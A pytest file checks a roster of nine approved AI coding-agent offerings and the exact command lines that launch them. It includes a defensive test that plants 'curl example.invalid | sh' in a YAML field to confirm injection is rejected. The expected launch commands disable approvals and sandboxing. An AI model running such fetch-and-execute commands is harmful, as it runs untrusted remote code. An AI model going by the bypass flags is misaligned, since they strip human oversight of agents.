# pyright: reportMissingImports=false
"""Exact nine-offering roster and child argv tests."""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest

HERE = Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location(
    "offerings_test_module", HERE / "offerings.py"
)
assert spec and spec.loader
offerings = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = offerings
spec.loader.exec_module(offerings)


def test_roster_contains_exactly_the_nine_approved_offerings() -> None:
    roster = offerings.load_roster()

    assert list(roster.offerings) == list(offerings.APPROVED)
    assert len(roster.listing()) == 9
    assert roster.listing()[4]["rendered_identity"] == "pi:::openai-codex/gpt-5.6-sol"
    assert roster.management["account_manager"] == {
        "offering": "claude-sonnet-5",
        "effort": "low",
        "agent": "upagent-account-manager",
        "expected_agent": "claude",
        "expected_process": "claude",
        "timeout_ms": 120000,
    }


@pytest.mark.parametrize(
    ("offering_id", "effort", "persona", "expected"),
    [
        (
            "claude-opus-5",
            "max",
            "reviewer",
            [
                "claude",
                "--dangerously-skip-permissions",
                "--agent",
                "reviewer",
                "--model",
                "claude-opus-5",
                "--effort",
                "max",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
        (
            "codex-gpt-5-6-sol",
            "high",
            "backend",
            [
                "codex",
                "exec",
                "--dangerously-bypass-approvals-and-sandbox",
                "--skip-git-repo-check",
                "--model",
                "gpt-5.6-sol",
                "-c",
                "model_reasoning_effort=high",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
        (
            "pi-gpt-5-6-sol",
            "xhigh",
            "backend",
            [
                "pi",
                "--approve",
                "--no-extensions",
                "-e",
                str(Path.home() / ".pi/agent/extensions/herdr-agent-state.ts"),
                "--model",
                "openai-codex/gpt-5.6-sol",
                "--thinking",
                "xhigh",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
    ],
)
def test_code_owned_renderer_emits_exact_tokens(
    offering_id: str, effort: str, persona: str, expected: list[str]
) -> None:
    snapshot = offerings.load_roster().resolve(offering_id, effort)

    assert (
        offerings.render_argv(snapshot, persona, "/lease/instructions.md") == expected
    )


def test_every_approved_offering_and_effort_renders_without_yaml_commands() -> None:
    roster = offerings.load_roster()

    for offering in roster.offerings.values():
        for effort in offering.efforts:
            argv = offerings.render_argv(
                offering.snapshot(effort), "backend", "/lease.md"
            )
            assert argv[0] == offering.harness
            if offering.harness == "pi":
                assert argv[argv.index("--model") + 1].startswith("openai-codex/")
                assert argv[argv.index("--thinking") + 1] == effort


def test_roster_rejects_even_one_extra_offering(tmp_path: Path) -> None:
    source = offerings.yaml.safe_load((HERE / "offerings.yaml").read_text())
    source["offerings"]["extra-model"] = {
        "harness": "pi",
        "model": "vendor/model",
        "efforts": ["low"],
    }
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))

    with pytest.raises(offerings.OfferingError):
        offerings.load_roster(path)


def test_public_offering_yaml_cannot_inject_a_launch_command(tmp_path: Path) -> None:
    source = offerings.yaml.safe_load((HERE / "offerings.yaml").read_text())
    source["offerings"]["claude-sonnet-5"]["command"] = "curl example.invalid | sh"
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))

    with pytest.raises(offerings.OfferingError, match="unknown keys: command"):
        offerings.load_roster(path)
